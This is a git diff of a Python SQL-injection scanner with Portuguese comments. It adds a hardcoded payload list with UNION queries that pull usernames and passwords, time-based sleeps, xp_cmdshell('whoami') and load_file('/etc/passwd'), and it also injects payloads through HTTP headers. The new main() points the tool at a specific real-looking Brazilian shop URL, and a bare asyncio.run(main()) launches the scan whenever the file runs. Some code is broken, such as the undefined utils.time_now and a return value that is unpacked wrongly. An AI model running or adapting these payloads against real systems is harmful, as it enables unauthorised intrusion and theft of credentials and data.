@@ -23,7 +23,7 @@ async def sqli_score_system(payload, response):
 
 
 # response -> resposta bruta da requisicao
-async def waf_detection(response):
+async def sqli_waf_detection(response):
     score = 0
     waf_servers = [
         'cloudflare', 'sucuri', 'akamai', 'imperva', 'incapsula', 'barracuda',
@@ -55,15 +55,55 @@ async def waf_detection(response):
     score += sum(v for v in waf_possibility.values())
     return True if score >= 10 else False
 
-# target -> origem
-# payload -> carga enviada
-# response -> resposta bruta da request
-# score_sqli -> score que atesta vulnerabilidade
-# continue_ -> valor booleano que decide se continua ou nao apos encontrar vulnerabilidade
-async def response_analyzer(target, payload, response, score_sqli):
-    score = 0
-    details = {}
-    html_sample = ""
+
+# file -> wordlist
+async def sqli_useragent(file='wordlists/sqli/injection.txt'):
+    with open(file, 'r') as f:
+        lines = f.readlines()
+    
+    headers = {
+        'User-Agent': lines[random.randint(0, len(lines)-1)].strip(),
+        'Referer': lines[random.randint(0, len(lines)-1)].strip(),
+        'X-Forwarded-For': lines[random.randint(0, len(lines)-1)].strip(),
+    }
+    return headers
+
+
+
+async def sqli(origin, file=None, ua_status=False, headers=None, timeout=10, SSL=True, proxies=None, interval=1, continue_=False, score_sqli=False, try_requests=1):
+    # CONSTANTES
+    name_save_file = 'sqli_test.json'
+    scheme = 'https' if SSL else 'http'
+
+    default_payload = [
+        "1 OR 1=1",
+        "' OR '1'='1'--",
+        "' UNION SELECT NULL,NULL--",
+        "' UNION SELECT username, password FROM users--",
+        "admin' --",
+        "admin' #",
+        "admin'/*",
+        "' OR 1=1#",
+        "' OR 'x'='x",
+        "1 AND 1=2",
+        "1 UNION ALL SELECT NULL,NULL,NULL--",
+        "1' AND SLEEP(5)--",
+        "1' AND pg_sleep(5)--",
+        "1 WAITFOR DELAY '00:00:05'--",
+        "' OR EXISTS(SELECT * FROM users)--",
+        "' UNION SELECT table_name FROM information_schema.tables--",
+        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
+        "1; EXEC xp_cmdshell('whoami')--",
+        "1; SELECT load_file('/etc/passwd')--",
+        "' UNION SELECT 1,database(),user()--",
+        "admin' AND 1=(SELECT COUNT(*) FROM tablename)--",
+        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>77--",
+        "' OR updatexml(1,concat(0x7e,(SELECT database())),0)--",
+        "' OR extractvalue(1,concat(0x7e,(SELECT user())))--",
+        "1;SELECT+PG_SLEEP(5)",
+        "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
+    ]
+    
     error_messages = {
         'mysql': [
             r"You have an error in your SQL syntax", r"mysql", r"SQL syntax", 
@@ -119,108 +159,71 @@ async def response_analyzer(target, payload, response, score_sqli):
         ],
     }
 
-    if score_sqli:
-        score = await sqli_score_system(payload, response)
-        details['sqli_score'] = score
-
-    for k, v in error_messages.items(): # itera sobre o dicionario
-        # if any(re.search(error_msg.lower(), response.text.lower()) for error_msg in v): # verifica o tipo de erro no retorno
-        for error_msg in v:
-            if re.search(error_msg.lower(), response.text.lower(), re.IGNORECASE | re.DOTALL):
-                details['database_type'] = k
-                details['work_sqli'] = True
-                
-                print(f'{" "*3}[>][{commons.time_now()}][{response.status_code}] Possivel vulnerabilidade: {target} -> {payload}')
-                print(f'{" "*3}[>] Tipo: {k} Msg: {error_msg} url: {response.url} Score: {score}')
-            else:
-                details['work_sqli'] = False
-    details['waf'] = await waf_detection(response) # verifica a chance de ter waf
-    html_sample = response.text if response.status_code in [301, 302, 307] else response.text[:500] # recolhe amostra do http
-
-    return details, score, html_sample
-
-
-async def sqli(target, wordlist_file, option, save_file, ua_status, headers, cookies, timeout, SSL, proxies, interval, continue_, score_sqli, try_requests, verbose):
-    #scheme = 'https' if SSL else 'http'
-    save_file = save_file if save_file.endswith('.json') else f'{save_file.rsplit(".", 1)[0]}.json'
-    if wordlist_file is None:
-        print(f'[#][{commons.time_now()}] Usando payloads padrao')
-        wordlist_file = 'wordlists/sqli/default_payload.txt'
-
-    status_payload, payloads = await commons.fileReader(wordlist_file)
-    if not status_payload:
-        print(f'[-][{commons.time_now()}] {payloads}')
-        return False, payloads
-
-    async def engine(payload, url, headers=None):
-        await asyncio.sleep(interval)
-        if verbose:
-            print(f'[+][{commons.time_now()}] Tentando: {url}')
-        if option == 'headers' and verbose:
-            print(f'{" "*3}[>][{commons.time_now()}] {headers}')
-        
-        status, r = commons.request(url, timeout=timeout, SSL=SSL, headers=headers, cookies=cookies,
-                                    ua_status=ua_status, redirect=False, proxies=proxies, try_requests=try_requests)
-        
-        if status:
-            details, score, html_sample = await response_analyzer(target, payload, r, score_sqli=score_sqli)
-            if details['work_sqli'] and not continue_:
-                print(f'[#][{commons.time_now()}][{response.status_code}] Possivel vulnerabilidade: {target} -> {payload}')
-                return details, score, html_sample
-        else:
-            print(f'{" "*3}[>][{commons.time_now()}] Falha ao requisitar: {r}')
-            details, score, html_sample = {}, 0, ''
-        
-        json_obj = jsonlog.ObjectJsonCommon.from_data(
-            domain=target, payload=payload, url=url, ip='', r=r,
-            html_sample=html_sample, details=details
-        )
-        await jsonlog.AsyncLogger(save_file).json_write(json_obj)
-
-    if option == 'query string':
-        if not '*' in target:
-            return False, f'[#][{commons.time_now()}] Nao ha indicativo de substituicao (*).. Ex: example.com/?=*'    
-        for payload in payloads:
-            payload = payload.strip()
-            target = f"{target.split('://')[0]}://{target.split('://')[1]}" if target.startswith('http://') or target.startswith('https://') else f'https://{target}' if SSL else f'http://{target}'
-            url = f'{target}'.replace('*', payload)
-            await engine(payload, url)
-
-        return True, f'[#][{commons.time_now()}] Wordlist concluida: {wordlist_file} → {save_file}'
-
-    elif option == 'headers':
-        total_combinations = len(payloads) ** 3
-        used_combinations = set()
-
-        while len(used_combinations) < total_combinations:
-            current_headers = {
-                'User-Agent': random.choice(payloads).strip(),
-                'Referer': random.choice(payloads).strip(),
-                'X-Forwarded-For': random.choice(payloads).strip(),
-            }
-            combo_key = frozenset(current_headers.items())
-            if combo_key in used_combinations:
-                continue
-
-            used_combinations.add(combo_key)
-            url = f"{target.split('://')[0]}://{target.split('://')[1]}" if target.startswith('http://') or target.startswith('https://') else f'https://{target}' if SSL else f'http://{target}'  # aqui o payload está no header, não na URL
-            await engine(f'UA:{current_headers["User-Agent"]}|Ref:{current_headers["Referer"]}|IP:{current_headers["X-Forwarded-For"]}', url, headers=current_headers)
-
-        return True, f'[#][{commons.time_now()}] Wordlist concluida: {wordlist_file} → {save_file}'
-
+    if file == None:
+        print(f'[#][{commons.time_now()}] Implementando o uso de payloads padrao')
+        payloads = default_payload
     else:
-        return False, f'[-][{commons.time_now()}] Opcao invalida: {option}'
+        status_payload, payloads = await commons.fileReader(file)
+        if not status_payload:
+            print(f'[-][{commons.time_now()}] {payloads}')
+            return False, payloads
+    
+    async def sqli_async(payloads):
+        for payload in payloads:
+            # VARIAVEIS
+            score = 0
+            details = {}
+            html_sample = ''
 
+            payload = payload.strip()
+            url = f'{scheme}://{origin}'.replace('*', payload)
 
-# Attack
-async def main(target, wordlist_file='wordlists/sqli/default_payload.txt', option='query string', save_file='sqli_test.json', ua_status=False, headers=None, cookies=None, timeout=10, SSL=True, proxies=None, interval=0, continue_=False, score_sqli=False, try_requests=1, verbose=True):
+            await asyncio.sleep(interval)
+
+            print(f'[+][{commons.time_now()}] Tentando: {url}')
+            status, r = commons.request(url, timeout=timeout, SSL=SSL, headers=headers,
+                                        ua_status=ua_status, redirect=False, proxies=proxies, try_requests=try_requests)
+            
+            if status:
+                for k, v in error_messages.items(): # itera sobre o dicionario
+                    # if any(error_msg.lower() in r.text.lower() for error_msg in v): 
+                    if any(re.search(error_msg.lower(), r.text.lower()) for error_msg in v): # verifica o tipo de erro no retorno
+                        details['database_type'] = k
+
+                        if score_sqli:
+                            score = await sqli_score_system(payload, r)
+                            details['sqli_score'] = score
+                        
+                        print(f'{" "*3}[>][{commons.time_now()}][{r.status_code}] Possível vulnerabilidade: {url} -> {payload}')
+                        print(f'{" "*3}[>] Tipo: {k} Msg: {error_msg} url: {url} Score: {score}')
+                        
+                        if not continue_:
+                            return True, f'[#][{utils.time_now()}][{r.status_code}] Possível vulnerabilidade: {url} -> {payload}'
+                
+                details['waf'] = await sqli_waf_detection(r) # verifica a chance de ter waf
+                html_sample = r.text if r.status_code in [301, 302, 307] else r.text[:500] # recolhe amostra do http
+            # retorna em caso de erros na requisicao
+            else:
+                print(f'{" "*3}[>][{commons.time_now()}] Falha ao requisitar: {r}')
+            
+            # transforma em json object
+            json_obj_response = jsonlog.ObjectJson.from_data(domain=origin, payload=payload, url=url, ip='', r=r, html_sample=html_sample, details=details)
+            write = await jsonlog.AsyncLogger(name_save_file).json_write(json_obj_response)
+
+        return True, f'[#] Wordlist concluido: {file} & Gerado arquivo: {name_save_file}'
+    
+    await sqli_async(payloads) # executa todo o loop e aguarda
+            
+
+# Exemplo de uso
+async def main():
     try:
-        status, attk = await sqli(target, wordlist_file, option, save_file, ua_status, headers, cookies, timeout, SSL, proxies, interval, continue_, score_sqli, try_requests, verbose)
-        if status:
-            return True, f'[#] Execucao finalizada: {attk}'
-        else:
-            return False, f'[#] Execucao finalizada: {attk}'
+        status, attk = await sqli(
+            'www.constinta.com.br/v1-index-php-lojas?srsltid=*',
+            continue_=True,
+            score_sqli=True,
+        )
     except TypeError:
-        return False, f'[#] Um erro de tipagem surgiu'
-    except Exception as err:
-        return False, f'[#] Um erro surgiu & a execucao foi interrompida {err}'
+        return True, f'[#] Execucao finalizada'
+
+asyncio.run(main())
